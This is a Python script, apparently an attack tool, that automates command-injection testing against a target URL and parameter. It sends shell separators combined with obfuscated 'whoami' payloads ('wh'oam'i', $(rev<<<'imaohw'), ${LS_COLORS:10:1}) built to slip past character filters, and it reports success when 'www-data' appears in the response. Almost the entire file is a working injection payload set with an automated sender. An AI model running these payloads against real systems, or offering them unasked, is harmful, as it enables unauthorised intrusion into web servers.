#!/usr/bin/env python3

import requests, argparse

class CommandInjection():
    def __init__(self, url, param, method, whitelist_char):
        self.url = url
        self.param = param
        self.method = method
        self.whitelist_char = whitelist_char

    def req(self, symbol_char, obfus_char):
        data = {
            self.param : self.whitelist_char + symbol_char + obfus_char,
        }
        try:
            if self.method == "post" or self.method == "POST":
                response = requests.post(url=self.url, data=data)
            elif self.method == "get" or self.method == "GET":
                response = requests.get(url=self.url, params=data) 
            else:
                print("Enter valid method type")
            return response.text
        except Exception as e:
            return e

    def blacklisted_chars(self):
        characters = [";", "&", "|", "\n", "${LS_COLORS:10:1}"]
        obfuscated = ["whoami", "wh\'oam\'i", "$(rev<<<'imaohw')"]
        for symbol_char in characters:
            for obfus_char in obfuscated:
                response = self.req(symbol_char, obfus_char)
                if "www-data" in response:
                    print("command injection successfull for: " + symbol_char + obfus_char)
                    return True
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Simple Command Injection Automation")
    parser.add_argument('-u', '--url', help='Enter the target url', required=True)
    parser.add_argument('-p', '--param', help='Enter parameter to pass the injection', required=True)    
    parser.add_argument('-m', '--method', help='Choose POST or GET method', required=True)
    parser.add_argument('-w', '--whitelist_character', help='Specify if any whitelisted characters have to be passed')
    args = parser.parse_args()
    request = CommandInjection(args.url, args.param,args.method, args.whitelist_character)
    if request.blacklisted_chars() != True:
        print("command injection not possible")
